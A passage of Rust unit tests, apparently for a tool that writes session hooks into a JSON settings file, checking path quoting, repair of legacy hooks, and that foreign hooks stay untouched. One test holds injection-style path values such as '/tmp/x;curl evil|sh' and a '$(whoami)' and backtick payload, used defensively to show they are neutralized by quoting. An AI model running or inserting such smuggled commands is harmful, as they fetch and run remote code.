    fn hooks_carry_the_entity_root() {
        let mut settings = serde_json::json!({});
        let (changed, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        assert!(skipped.is_empty());

        let text = settings.to_string();
        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
        assert!(text.contains("checkpoint --trigger precompact --entity-root '/home/d/.wiseferry'"));
        assert!(text.contains("consume '/home/d/.wiseferry'"));
    }

    /// The pre-4.2 bare hook is exactly what left capture broken outside the
    /// entity root. A re-run of `init` must repair it, not declare it present.
    #[test]
    fn a_legacy_bare_hook_is_rewritten_not_skipped() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionStart": [{
                    "matcher": "startup|resume",
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo consume"}]
                }],
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]
                }],
                "PreCompact": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo checkpoint --trigger precompact"}]
                }]
            }
        });
        let (changed, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        assert!(skipped.is_empty());

        let text = settings.to_string();
        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
        // Rewritten in place, not duplicated alongside the bare form.
        assert_eq!(text.matches("archive-session").count(), 1);
        assert_eq!(text.matches("checkpoint").count(), 1);
        assert_eq!(text.matches("consume").count(), 1);
    }

    #[test]
    fn a_correct_hook_set_is_left_unchanged() {
        let mut settings = serde_json::json!({});
        upsert(&mut settings, "/home/d/.wiseferry");

        let before = settings.clone();
        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(!changed);
        assert_eq!(settings, before);
    }

    #[test]
    fn foreign_hooks_are_never_touched() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "notify-send done"}]
                }]
            }
        });
        upsert(&mut settings, "/home/d/.wiseferry");

        let text = settings.to_string();
        assert!(text.contains("notify-send done"));
        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
    }

    /// A recall-echo hook the user wrapped or guarded — the `|| true`
    /// SessionEnd guard pulse-null depends on, a `timeout` prefix, a chained
    /// cleanup — is deliberate configuration. Repairing it would break it;
    /// it must be reported and left alone, and not duplicated either.
    #[test]
    fn a_wrapped_recall_hook_is_reported_not_rewritten() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session || true"}]
                }]
            }
        });
        let (_, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
        assert_eq!(skipped.len(), 1);
        assert!(
            skipped[0].contains("archive-session || true"),
            "{skipped:?}"
        );

        let text = settings.to_string();
        assert!(text.contains("archive-session || true"));
        // Not duplicated with a canonical form alongside it.
        assert_eq!(text.matches("archive-session").count(), 1);
    }

    /// Quoting is unconditional and single-quoted: `$`, backticks, `;`, `"`
    /// and spaces must all reach the shell as literal path bytes.
    #[test]
    fn a_root_with_shell_metacharacters_is_neutralized() {
        for (root, quoted) in [
            (
                "/Users/d/My Files/.wiseferry",
                "'/Users/d/My Files/.wiseferry'",
            ),
            ("/tmp/x;curl evil|sh", "'/tmp/x;curl evil|sh'"),
            ("/tmp/$(whoami)/`id`", "'/tmp/$(whoami)/`id`'"),
        ] {
            let mut settings = serde_json::json!({});
            upsert(&mut settings, root);
            let text = settings.to_string();
            // None of these roots contain characters JSON escapes, so a
            // plain substring check sees exactly what the shell will.
            assert!(
                text.contains(&format!("--entity-root {quoted}")),
                "{root}: {text}"
            );
        }
    }

    /// An embedded single quote is the one byte single-quoting cannot pass
    /// through directly — it must be closed, escaped, reopened.
    #[test]
    fn an_embedded_single_quote_is_escaped() {
        assert_eq!(
            shell_path(Path::new("/home/d/o'brien")),
            r"'/home/d/o'\''brien'"
        );
    }

    /// Two stale hooks under one event — a binary-path change under the old
    /// installer could leave both — must both be repaired in one pass, not
    /// first-one-wins with the duplicate left permanently unreachable.
    #[test]
    fn duplicate_stale_hooks_are_both_repaired() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [
                    {"hooks": [{"type": "command", "command": "/old/path/recall-echo archive-session"}]},
                    {"hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]}
                ]
            }
        });
        let (changed, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        assert!(skipped.is_empty());

        let expected =
            "/usr/local/bin/recall-echo archive-session --entity-root '/home/d/.wiseferry'";
        let text = settings.to_string();
        assert_eq!(text.matches(expected).count(), 2, "{text}");
        // And a second run has nothing left to do.
        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(!changed);
    }

    #[test]
    fn archive_template_has_header() {
        let tmp = tempfile::tempdir().unwrap();
        let mut reader = Cursor::new(b"skip\n" as &[u8]);
        run_with_reader(tmp.path(), &mut reader).unwrap();
        let content = fs::read_to_string(tmp.path().join("memory/ARCHIVE.md")).unwrap();
        assert!(content.contains("# Conversation Archive"));
        assert!(content.contains("| # | Date"));
    }
}
